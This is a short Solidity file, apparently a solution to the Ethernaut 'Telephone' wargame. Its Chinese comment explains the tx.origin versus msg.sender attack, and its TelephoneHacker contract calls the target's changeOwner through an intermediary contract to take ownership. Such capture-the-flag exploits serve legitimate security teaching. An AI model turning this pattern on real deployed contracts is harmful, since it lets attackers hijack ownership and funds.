// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
/*
*  tx.origin 和 msg.sender攻击 （目标合约可能存在判断条件 tx.origin = msg.sender）
实现方式：通过外部合约调用，使目标合约的 tx.origin = msg.sender 不成立
*/
import {Telephone} from "./02_Telephone.sol";

contract TelephoneHacker {
    Telephone telephone;
    constructor(address _telephone){
        telephone = Telephone(_telephone);
    }

    function hack(address _owner) public {
        telephone.changeOwner(_owner);
    }
}